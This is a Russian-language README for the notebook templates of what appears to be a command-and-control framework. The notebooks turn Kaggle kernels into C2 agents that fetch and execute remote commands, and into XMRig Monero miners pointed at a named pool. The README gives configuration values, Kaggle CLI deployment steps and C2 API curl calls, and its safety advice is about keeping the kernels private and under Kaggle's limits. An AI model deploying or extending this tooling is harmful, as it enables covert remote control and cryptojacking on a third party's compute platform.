# Kaggle Notebooks Templates

Организованная коллекция шаблонов ноутбуков для различных задач.

## 📁 Структура

```
notebooks/
├── agent_notebook.ipynb              # C2 агент с интернетом
├── agent_notebook_dataset.ipynb      # C2 агент без интернета (dataset-based)
├── mining_notebook.ipynb             # XMRig майнинг
├── gpu_optimizer_notebook.ipynb      # GPU оптимизация
└── README.md                         # Этот файл
```

## 🎯 Назначение ноутбуков

### 1. agent_notebook.ipynb
**C2 Agent (Internet-enabled)**
- Требует: Internet ON
- Подключается к C2 серверу через HTTP/HTTPS
- Получает команды в реальном времени
- Отправляет результаты выполнения

**Использование:**
```python
C2_URL = "https://your-server.com"
KERNEL_ID = "kaggle-username-agent1"
POLL_INTERVAL = 30  # секунды
```

### 2. agent_notebook_dataset.ipynb
**C2 Agent (Dataset-based, No Internet)**
- Требует: Internet OFF
- Читает команды из Kaggle Dataset
- Выполняет команды локально
- Результаты сохраняются в output

**Использование:**
```python
KERNEL_ID = "kaggle-username-agent1"
COMMANDS_DATASET = "username/c2-commands"
```

### 3. mining_notebook.ipynb
**XMRig Cryptocurrency Mining**
- Майнинг Monero (XMR)
- Оптимизирован для CPU
- Низкий приоритет (nice -n 19)
- Автоматическая настройка

**Конфигурация:**
```python
WALLET = "your-xmr-wallet"
POOL = "gulf.moneroocean.stream:10128"
WORKER = "kaggle-worker-1"
```

### 4. gpu_optimizer_notebook.ipynb
**GPU Compute Optimization**
- Использует PyTorch для GPU вычислений
- Автоматическое определение устройства
- Интеграция с C2_server пакетом
- Мониторинг статуса

## 🚀 Деплой

### Через C2 Panel
1. Откройте **Laboratory** → **Kaggle Machines**
2. Выберите аккаунт и kernel
3. Нажмите **Deploy** → выберите шаблон
4. Kernel автоматически запустится

### Через API
```bash
curl -X POST http://localhost:5000/api/kaggle/deploy/agent \
  -H "Content-Type: application/json" \
  -d '{"c2_url": "https://your-server.com", "poll_interval": 30}'
```

### Вручную (Kaggle CLI)
```bash
# 1. Создать kernel
kaggle kernels init -p /tmp/kernel

# 2. Скопировать notebook
cp templates/notebooks/agent_notebook.ipynb /tmp/kernel/notebook.ipynb

# 3. Настроить metadata
cat > /tmp/kernel/kernel-metadata.json << EOF
{
  "id": "username/kernel-name",
  "title": "C2 Agent",
  "code_file": "notebook.ipynb",
  "language": "python",
  "kernel_type": "notebook",
  "is_private": true,
  "enable_gpu": true,
  "enable_internet": true
}
EOF

# 4. Push
kaggle kernels push -p /tmp/kernel
```

## 🔧 Кастомизация

### Добавить свой ноутбук
1. Создайте `.ipynb` файл в этой папке
2. Используйте существующие как шаблон
3. Обновите этот README

### Переменные окружения
Все ноутбуки поддерживают переменные:
- `C2_URL` - адрес C2 сервера
- `KERNEL_ID` - ID kernel для идентификации
- `POLL_INTERVAL` - интервал опроса (секунды)
- `WALLET` - кошелек для майнинга
- `POOL` - адрес пула

## 📊 Мониторинг

### Проверка статуса kernels
```bash
# Через C2 API
curl http://localhost:5000/api/kaggle/agents/status

# Через Kaggle CLI
kaggle kernels status username/kernel-name
```

### Получение результатов
```bash
# Output файлы
kaggle kernels output username/kernel-name -p /tmp/output

# Логи
cat /tmp/output/*.log
```

## ⚠️ Безопасность

1. **Приватные kernels**: Всегда используйте `"is_private": true`
2. **Credentials**: Не храните API ключи в коде
3. **Encryption**: Используйте HTTPS для C2 коммуникации
4. **Rate limiting**: Не превышайте лимиты Kaggle (5 CPU sessions)

## 📝 Лимиты Kaggle

- **CPU Sessions**: 5 одновременно
- **GPU Sessions**: 2 одновременно (30h/week)
- **TPU Sessions**: 2 одновременно (30h/week)
- **Execution Time**: 9 часов максимум
- **Internet**: Ограничен список доменов

## 🔗 Ссылки

- [Kaggle Kernels API](https://github.com/Kaggle/kaggle-api)
- [C2 Server Docs](../../docs/)
- [XMRig Documentation](https://xmrig.com/docs)

---

**Version:** 1.0  
**Last Updated:** 2026-03-24  
**Maintainer:** C2 Server Team
